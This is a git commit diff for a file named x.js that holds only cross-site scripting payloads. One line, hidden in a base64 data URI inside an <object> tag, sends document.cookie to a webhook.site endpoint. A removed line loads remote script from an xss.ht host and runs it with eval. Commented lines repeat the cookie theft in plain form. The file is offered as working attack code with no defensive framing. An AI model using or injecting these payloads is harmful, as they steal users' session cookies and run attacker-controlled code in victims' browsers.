5881908cf825062199e1944b199c227cb1b05137
HotPlugin <57496383+hotplugin0x01@users.noreply.github.com>
2022-10-27 02:34:35 +0500

    Update x.js

--- x.js
+++ x.js
@@ -1,5 +1,8 @@
 // document.location='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?'+document.cookie;
-function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//hailxss.xss.ht");a.send();
+
+<object data="data:text/html;base64,ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL2Q3ZTU5MzQ5LWM2MWEtNDk4Yi05YzAwLTVmYWQ5N2E5ZTI5My8/Yz0iK2RvY3VtZW50LmNvb2tpZSk="></object>
+
+// function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//hailxss.xss.ht");a.send();
 // fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie);
 
 
